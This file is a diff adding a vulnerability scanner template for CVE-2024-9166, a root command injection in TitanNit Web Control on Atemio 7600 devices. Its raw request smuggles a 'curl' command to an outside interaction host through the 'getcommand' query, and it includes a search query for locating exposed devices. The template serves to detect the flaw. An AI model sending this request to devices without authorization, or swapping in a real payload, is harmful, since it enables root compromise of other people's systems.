@@ -1,0 +1,43 @@
+id: CVE-2024-9166
+
+info:
+  name: "TitanNit Web Control 2.01 7600 getcommand 命令注入漏洞"
+  author: DhiyaneshDk
+  severity: critical
+  description: |
+    The device contains a command injection caused by the 'getcommand' query in the application, letting unauthorized attackers execute system commands with root privileges, exploit requires attacker to send crafted requests.
+  reference:
+    - https://www.cisa.gov/news-events/ics-advisories/icsa-24-270-03
+    - https://www.exploit-db.com/exploits/51853
+    - https://github.com/Andrysqui/CVE-2024-9166
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5801.php
+  classification:
+    cve-id: CVE-2024-9166
+    cwe-id: CWE-78
+    epss-score: 0.12011
+    epss-percentile: 0.93087
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="TitanNit Web Control"
+  tags: TitanNit-Web-Control,Atemio-7600
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /query?getcommand=&cmd=curl+http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
+
+      - type: word
+        part: body
+        words:
+          - "titan.css"
+# digest: 4b0a00483046022100d751fdb41882f2d63778857834520197c3ecae09cddde9bf59258f8cb0ecc7b602210095904eb5138aa5ced36ae32fd6a6626c38b85a4b5feed99b30f60c51c7942a92:922c64590222798bb761d5b6d8e72950
